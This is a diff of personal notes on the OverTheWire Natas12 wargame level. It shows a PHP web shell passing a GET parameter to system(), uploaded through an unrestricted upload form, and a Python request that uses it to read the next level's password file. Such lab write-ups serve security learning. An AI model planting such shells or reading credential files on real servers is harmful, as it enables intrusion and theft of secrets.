@@ -3,13 +3,13 @@
 
 Source: #youtube #overthewire #natas #web 
 
-Tags:
+Tags:[[Local File Inclusion & Command Injection]]
 
 Natas12
 
 we have a unrestricted file upload functionality 
 
-create a `php` file with the following contents, we will modify the `c` parameter later 
+create a `php` file named `revshell.php` with the following contents, we will modify the `c` parameter later 
 ```
 <?php
 	system($_GET['c']);
@@ -30,7 +30,10 @@ response = sessions.get(url + 'upload/kx42yjw6zv.php?c=cat /etc/natas_webpass/na
 
 print(response.text)
 ```
-1. commented code tells the 
+1. commented code uploads our created `php` file  using `.post` method  
+2. the output of the commented code will reveal the newly created file name on the server of the file that we uploaded 
+3. in our case the path is `upload/kx42yjw6zv.php`
+4. we append the path to the `url` and try executing commands by adding our commands to the previously defined `c` parameter.
 
 
 
